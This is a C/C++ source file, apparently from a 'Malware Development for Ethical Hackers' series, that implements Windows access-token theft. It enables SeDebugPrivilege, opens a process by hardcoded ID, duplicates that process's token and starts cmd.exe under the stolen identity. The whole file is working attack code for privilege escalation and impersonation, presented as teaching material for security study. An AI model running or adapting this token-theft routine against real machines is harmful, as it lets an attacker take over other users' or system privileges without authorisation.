/*
 * Malware Development for Ethical Hackers
 * hack.c
 * token theft
 * enable set of privileges
 * author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>
#include <iostream>

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
    HANDLE token;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    BOOL res = TRUE;

    if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;

    CloseHandle(token);

    printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
    return res;
}

// get access token
HANDLE getToken(DWORD pid) {
    HANDLE cToken = NULL;
    HANDLE ph = NULL;
    if (pid == 0) {
        ph = GetCurrentProcess();
    }
    else {
        ph = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, true, pid);
    }
    if (!ph) cToken = (HANDLE)NULL;
    printf(ph ? "successfully get process handle :)\n" : "failed to get process handle :(\n");
    BOOL res = OpenProcessToken(ph, MAXIMUM_ALLOWED, &cToken);
    if (!res) cToken = (HANDLE)NULL;
    printf((cToken != (HANDLE)NULL) ? "successfully get access token :)\n" : "failed to get access token :(\n");
    return cToken;
}

// create process
BOOL createProcess(HANDLE token, LPCWSTR app) {
    HANDLE dToken = NULL;
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    BOOL res = TRUE;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.cb = sizeof(STARTUPINFOW);

    res = DuplicateTokenEx(token, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dToken);
    printf(res ? "successfully duplicate process token :)\n" : "failed to duplicate process token :(\n");
    res = CreateProcessWithTokenW(dToken, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
    if (!res) {
        DWORD err = GetLastError();
        printf("Process Creation Failed: %u \n", err);
    }
    else printf("successfully created Process");
    return res;
}

int main(int argc, char** argv) {
    if (!setPrivilege(SE_DEBUG_NAME)) return -1;
    HANDLE cToken = getToken(7488);
    if (!createProcess(cToken, L"C:/Windows/System32/cmd.exe")) return -1;
    std::string pid="";
    std::cin >> pid;
    return 0;
}